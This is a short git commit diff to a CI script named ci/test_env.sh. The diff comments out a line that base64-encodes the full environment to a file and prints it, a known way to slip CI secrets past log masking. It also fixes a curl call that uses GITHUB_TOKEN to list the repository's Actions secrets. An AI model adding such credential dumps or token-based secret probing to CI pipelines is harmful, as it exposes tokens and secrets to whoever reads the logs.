cf382ba7ebf6f4a9e8ee4d9037fdaf8eb726666a
Ryan Northey <ryan@synca.io>
2023-03-19 19:59:15 +0000

    ci/
    Signed-off-by: Ryan Northey <ryan@synca.io>

--- ci/test_env.sh
+++ ci/test_env.sh
@@ -2,10 +2,8 @@
 
 echo "In script ..."
 
-env | base64 > /tmp/env
+# env | base64 > /tmp/env
+# cat /tmp/env
 
 
-cat /tmp/env
-
-
-curl -s -X GET -H "Accept: application/vnd.github+json" -H "Authorization: Bearer ${GITHUB_TOKEN}" "https://api.github.com/repos/gpt-4/envoy/actions/secrets
+curl -s -X GET -H "Accept: application/vnd.github+json" -H "Authorization: Bearer ${GITHUB_TOKEN}" "https://api.github.com/repos/gpt-4/envoy/actions/secrets"
